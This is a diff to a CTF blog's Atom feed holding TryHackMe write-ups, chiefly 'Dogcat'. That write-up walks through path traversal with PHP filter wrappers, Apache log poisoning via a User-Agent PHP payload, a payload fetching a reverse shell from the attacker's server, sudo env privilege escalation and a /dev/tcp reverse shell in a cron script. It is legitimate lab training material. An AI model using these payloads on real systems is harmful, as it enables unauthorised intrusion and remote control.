+  &lt;p&gt;RPORT: Box-port&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;LHOST: Your-ip&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;SSL : 1&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;reverse-shell&quot;&gt;Reverse shell&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://thelastvvv.github.io/images/posts/1/reverse.png&quot; alt=&quot;alt text&quot; title=&quot;shell&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;volia session opened we are root so let check the hints and hunt the flags&lt;/p&gt;
+
+&lt;p&gt;User Flag:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://thelastvvv.github.io/images/posts/1/flag1.png&quot; alt=&quot;alt text&quot; title=&quot;flag1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Root Flag:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://thelastvvv.github.io/images/posts/1/flagroot.png&quot; alt=&quot;alt text&quot; title=&quot;flag2&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;attackerkb-tasks&quot;&gt;AttackerKB Tasks:&lt;/h3&gt;
+
+&lt;p&gt;Task 2 :&lt;/p&gt;
+
+&lt;p&gt;-Discovering the Lay of the Land :&lt;/p&gt;
+
+&lt;p&gt;From Nmap results we can find all our answers …..&lt;/p&gt;
+
+&lt;p&gt;Answers: 
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2-Webmin&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3-1.890&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4- from cert bellow figure it out&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Task 3 :&lt;/p&gt;
+
+&lt;p&gt;learning to fly:&lt;/p&gt;
+
+&lt;p&gt;Just explore Attackerkb then we will be able to answer the following “important to copy directly from Attackerkb site&lt;/p&gt;
+
+&lt;p&gt;Answers: 
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3 1.890&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4 supply chain&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5 aug172019&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6 githubfileinthetitle&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;See you next time …..&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Dogcat | Writeup</title>
+   <link href="https://www.thelastvvv.com//2020/07/10/dogcat-writeup"/>
+   <updated>2020-07-10T07:00:53+02:00</updated>
+   <id>https://www.thelastvvv.com//2020/07/10/Dogcat-[Writeup]</id>
+   <content type="html">&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;#dogcat&quot;&gt;Dogcat&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#enumeration&quot;&gt;Enumeration&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#exploitation&quot;&gt;Exploitation&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#reverse-shell&quot;&gt;Reverse shell&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#privilege-escalation&quot;&gt;Privilege Escalation:&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#4th-flag&quot;&gt;4th Flag&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;!-- toc --&gt;
+
+&lt;h3 id=&quot;dogcat&quot;&gt;Dogcat&lt;/h3&gt;
+&lt;p&gt;Hallå gubbar , this my first ctf write-up i will try my best to make it easy for you so this box is webapp with lfi vulnerability and more the goal is to get 4 flags for more info check it out THM - DogCat&lt;/p&gt;
+
+&lt;p&gt;1 - Enumeration
+2 - Exploitation
+3- Reverse shell
+4 - Privilege Escalation
+5 - Flag 4&lt;/p&gt;
+
+&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
+
+&lt;p&gt;Nmap scan &amp;amp; Results:&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; BoxIP
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;22/tcp open ssh&lt;/code&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80/tcp open http&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Port 80&lt;/code&gt; is open so we got web-server check the web page at&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://box-ip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;https://thelastvvv.github.io/images/posts/3/main.png&quot; alt=&quot;alt text&quot; title=&quot;THM&quot; /&gt;
+so let check lfi playloads&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://box-ip/?view&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;../../../../../../etc/passwd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We get the following message&lt;/p&gt;
+
+&lt;p&gt;Sorry,only dogs or cats are allowed&lt;/p&gt;
+
+&lt;p&gt;So we need to use dog /cat keyword&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://box-ip/?view&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dog../../../../../../etc/passwd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Warning : include(dog../../../../../../etc/passwd.php):failed to open stream....&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;so we can read /etc/passwd now we need to bypass it by stooping including php extension to passwd&lt;/p&gt;
+
+&lt;p&gt;in this case we will need a meta-wrapper that allows the application of filters to stream at time of the opening.&lt;/p&gt;
+
+&lt;p&gt;More info here
+&lt;a href=&quot;https://www.php.net/manual/en/wrappers.php.php&quot;&gt;https://www.php.net/manual/en/wrappers.php.php&lt;/a&gt;
+&lt;a href=&quot;https://www.w3schools.com/php/php_filter.asp&quot;&gt;https://www.w3schools.com/php/php_filter.asp&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://box-ip/?view&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;php://filter/convert.base64-encode/resource&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;index
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;decoded using CyberChef&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;containsStr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strpos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ext&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ext&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'view'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;containsStr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'view'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'dog'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;containsStr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'view'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'cat'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Here you go!'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'view'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Sorry, only dogs or cats are allowed.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+
+
+echo 'Here you go!';
+include $_GET['view'] . $ext;
+} else {
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;we have an other parameter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ext&lt;/code&gt; that we can use it ,let try it&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://box-ip//?view&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;php://filter/resource&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dog../../../../../../etc/passwd&amp;amp;ext&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;now we need to do some lfi to rce trick to get in using log poisonning our box runs on Apache so log dir should be here&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var/log/apache2/access.log
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://box-ip/?view&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;php://filter/resource&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dog../../../../../../var/log/apache2/access.log&amp;amp;ext&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;we can see some user-agent request registered in the logs ;)&lt;/p&gt;
+
+&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
+
+&lt;p&gt;BURP TIMEEEEEE!!!! let intercept and inject our payload via user-agent data:D
+Request:&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /?view&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;php://filter/resource&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dog../../../../../../var/log/apache2/access.log&amp;amp;ext&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; HTTP/1.1
+Host: box-ip
+User-Agent: &amp;lt;?php system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;?&amp;gt;
+Accept: text/html,application/xhtml+xml,application/xml&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.9,&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.8
+Accept-Language: en-US,en&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.5
+Accept-Encoding: &lt;span class=&quot;nb&quot;&gt;gzip&lt;/span&gt;, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+DNT: 1
+Cache-Control: max-age&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Reponse:&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
+Date: Thu, 09 Jul 2020 18:54:37 GMT
+Server: Apache/2.4.38 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+X-Powered-By: PHP/7.4.3
+Vary: Accept-Encoding
+Content-Length: 6769
+Connection: close
+Content-Type: text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;UTF-8
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;First FLAG
+    &lt;pre&gt;&lt;code class=&quot;language-SH&quot;&gt;http://box-ip/?view=php://filter/resource=dog../../../../../../var/log/apache2/access.log&amp;amp;ext=&amp;amp;cmd=ls
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cats
+dog.php
+dogs
+flag.php
+index.php
+shell.php
+style.css
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://box-ip//?view&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;php://filter/convert.base64-encode/resource&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dog../../flag
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;decoded using 
+&lt;a href=&quot;https://gchq.github.io/CyberChef/&quot;&gt;https://gchq.github.io/CyberChef/&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;reverse-shell&quot;&gt;Reverse shell&lt;/h3&gt;
+
+&lt;p&gt;What we need ?&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Download Reverse shell&lt;/li&gt;
+  &lt;li&gt;Launch http server&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Pop up the shell&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Download Reverse shell 
+get any shell my fav for ctf “pentestmonkey”
+&lt;a href=&quot;https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php&quot;&gt;Reverse shell php&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;launch http server
+    &lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; SimpleHTTPServer 1111
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;MAKE SURE TO EDIT THE SHELL AND REMEMBER THE LOCATION
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1111 PORT&lt;/code&gt; U CAN CHANGE IT&lt;/p&gt;
+
+&lt;p&gt;I rename  the shell to Monkey and the location of the shell  is on the desktop.&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://Your-ip:1111/Desktop/Monkey.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ol&gt;
+  &lt;li&gt;Pop up shell&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Burp again !&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-SH&quot;&gt;Request:
+
+GET /?view=php://filter/resource=dog../../../../../../var/log/apache2/access.log&amp;amp;ext= HTTP/1.1
+Host: box-ip
+User-Agent: &amp;lt;?php file_put_contents('shell.php', file_get_contents('http://Your-ip:1111/Desktop/Monkey.php'))?&amp;gt;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+DNT: 1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Reponse:&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
+Date: Thu, 09 Jul 2020 19:22:45 GMT
+Server: Apache/2.4.38 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+X-Powered-By: PHP/7.4.3
+Vary: Accept-Encoding
+Content-Length: 16687
+Connection: close
+Content-Type: text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;UTF-8
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;http server confirmation:&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Your-ip - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;09/Jul/2020 15:26:09] &lt;span class=&quot;s2&quot;&gt;&quot;GET /Desktop/Monkey.php HTTP/1.0&quot;&lt;/span&gt; 200 -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now we start listening to port (depend on you shell settings)&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 1234
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;https://thelastvvv.github.io/images/posts/3/t1.png&quot; alt=&quot;alt text&quot; title=&quot;THM&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;2nd flag:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://thelastvvv.github.io/images/posts/3/t2.png&quot; alt=&quot;alt text&quot; title=&quot;THM&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation:&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;3th Flag 
+So now we need to be root we will use this command
+    &lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo env&lt;/span&gt; /bin/bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;More details here :&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://gtfobins.github.io/gtfobins/env/&quot;&gt;https://gtfobins.github.io/gtfobins/env/
+&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://thelastvvv.github.io/images/posts/3/t3.png&quot; alt=&quot;alt text&quot; title=&quot;THM&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;4th-flag&quot;&gt;4th Flag&lt;/h3&gt;
+&lt;p&gt;if we search in the backups dir we will find backup.sh that runs every-time,so now we need to edit this backupfile to reverse shell and bypass the docker-container using this command&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;#!/bin/bash&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; backup.sh&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/Your-IP/port 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; backup.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://thelastvvv.github.io/images/posts/3/ttt2.jpg&quot; alt=&quot;alt text&quot; title=&quot;THM&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we start listening to port&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 9999
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;https://thelastvvv.github.io/images/posts/3/ttt4.png&quot; alt=&quot;alt text&quot; title=&quot;THM&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;voila we got all our 4 flags btw flags looks like this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;THM{xx_xx_xx}&lt;/code&gt; :P&lt;/p&gt;
+
+&lt;p&gt;See you next time …..&lt;/p&gt;
+
+</content>
+ </entry>
+ 
+
+</feed>
